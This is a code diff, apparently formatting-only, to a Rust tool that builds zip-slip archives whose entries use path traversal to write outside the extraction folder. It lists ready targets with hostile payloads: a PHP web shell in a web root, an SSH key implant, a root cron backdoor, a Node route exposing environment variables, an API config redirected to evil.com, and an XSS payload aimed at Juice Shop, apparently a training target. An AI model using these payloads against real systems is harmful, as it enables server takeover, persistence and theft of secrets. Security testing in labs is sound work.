@@ -42,8 +42,7 @@ pub fn create_zip_slip(
     let file = File::create(output_path)?;
     let mut zip = ZipWriter::new(file);
 
-    let options = FileOptions::default()
-        .compression_method(zip::CompressionMethod::Stored);
+    let options = FileOptions::default().compression_method(zip::CompressionMethod::Stored);
 
     zip.start_file(target_path, options)?;
     zip.write_all(content)?;
@@ -60,8 +59,7 @@ pub fn create_zip_slip_multi(
     let file = File::create(output_path)?;
     let mut zip = ZipWriter::new(file);
 
-    let options = FileOptions::default()
-        .compression_method(zip::CompressionMethod::Stored);
+    let options = FileOptions::default().compression_method(zip::CompressionMethod::Stored);
 
     for (target_path, content) in files {
         zip.start_file(*target_path, options)?;
@@ -78,27 +76,27 @@ pub fn common_targets() -> Vec<ZipSlipTarget> {
         ZipSlipTarget::new(
             "Web root",
             "../../var/www/html/shell.php",
-            b"<?php system($_GET['cmd']); ?>"
+            b"<?php system($_GET['cmd']); ?>",
         ),
         ZipSlipTarget::new(
             "SSH authorized_keys",
             "../../root/.ssh/authorized_keys",
-            b"ssh-rsa AAAA..."
+            b"ssh-rsa AAAA...",
         ),
         ZipSlipTarget::new(
             "Cron job",
             "../../etc/cron.d/backdoor",
-            b"* * * * * root /tmp/backdoor.sh"
+            b"* * * * * root /tmp/backdoor.sh",
         ),
         ZipSlipTarget::new(
             "Node.js app",
             "../../app/routes/backdoor.js",
-            b"module.exports = (req, res) => res.send(process.env)"
+            b"module.exports = (req, res) => res.send(process.env)",
         ),
         ZipSlipTarget::new(
             "Angular assets",
             "../../frontend/dist/frontend/assets/config.json",
-            b"{\"apiUrl\": \"http://evil.com\"}"
+            b"{\"apiUrl\": \"http://evil.com\"}",
         ),
     ]
 }
@@ -130,7 +128,7 @@ pub fn juice_shop_vtt_xss() -> ZipSlipTarget {
 
 00:00:00.000 --> 00:00:10.000
 </script><script>alert('xss')</script>
-"#
+"#,
     )
 }
 
@@ -144,22 +142,22 @@ mod tests {
     fn test_create_zip_slip() {
         let target_path = "../../test/file.txt";
         let content = b"malicious content";
-        
+
         create_zip_slip("test_zip.zip", target_path, content).unwrap();
-        
+
         // Verify
         let file = File::open("test_zip.zip").unwrap();
         let mut archive = ZipArchive::new(file).unwrap();
-        
+
         assert_eq!(archive.len(), 1);
-        
+
         let mut zip_file = archive.by_index(0).unwrap();
         assert!(zip_file.name().contains("../"));
-        
+
         let mut contents = Vec::new();
         zip_file.read_to_end(&mut contents).unwrap();
         assert_eq!(contents, content);
-        
+
         std::fs::remove_file("test_zip.zip").unwrap();
     }
 
